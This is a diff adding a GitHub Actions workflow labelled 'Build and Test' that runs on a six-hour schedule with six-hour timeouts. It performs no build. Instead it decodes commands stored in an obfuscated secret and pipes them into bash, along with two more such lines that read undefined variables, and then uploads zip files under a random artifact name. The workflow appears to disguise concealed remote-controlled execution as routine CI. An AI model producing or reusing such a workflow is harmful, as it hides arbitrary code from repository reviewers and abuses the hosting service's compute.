@@ -1,0 +1,35 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          izt25: ${{ secrets.izt25 }}
+        run: |
+          printf '%s' "$izt25" | jq -r .r067 | /bin/bash
+          echo $fk07 | jq -r .vco98 | /bin/bash
+          printf '%s' "$g52" | jq -r .abzqk115 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Pt5HjMHG
+          path: "*.zip"
+          retention-days: 1
